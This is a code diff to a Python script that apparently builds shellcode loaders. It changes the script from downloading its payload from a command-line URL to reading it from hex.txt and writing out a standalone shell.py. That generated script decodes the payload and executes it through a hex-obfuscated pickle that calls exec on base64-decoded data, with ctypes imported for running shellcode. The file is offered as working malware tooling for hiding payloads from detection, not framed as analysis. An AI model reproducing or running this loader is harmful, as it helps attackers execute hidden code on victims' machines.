@@ -1,4 +1,8 @@
-import requests
+import os
+f=open("hex.txt")
+a=f.readlines()
+f.close()
+neiro="""import requests
 import pickle
 import sys
 import base64
@@ -7,17 +11,9 @@ import re
 import os
 import base64
 import ctypes
-global dizhi
-dizhi=sys.argv[1]
-def load_shellcode():
-    global code
-    global dizhi
-    code=[]
-    res=requests.get(dizhi)
-    bs = res.text
-    bs=bs.split("\n")
-    code=bs
-load_shellcode()
+global code
+code=[]
+code={0}""".format(a)+"""
 a=re.findall("(\w)",code[1])
 def decode_string():
     n=0
@@ -53,7 +49,7 @@ shellcode=str(decode_string())
 code1="8003636275696{0}74696{2}730{1}657865630{1}710058230000002865786563286261736536342{2}6236346465636{3}6465287368656{0}6{0}636{3}646529292971018571025271032{2}".format("c","a","e","f")
 a1=bytes.fromhex(code1)
 pickle.loads(a1)
-
-
-
-
+"""
+w=open('shell.py','w+')
+w.write(neiro)
+w.close()
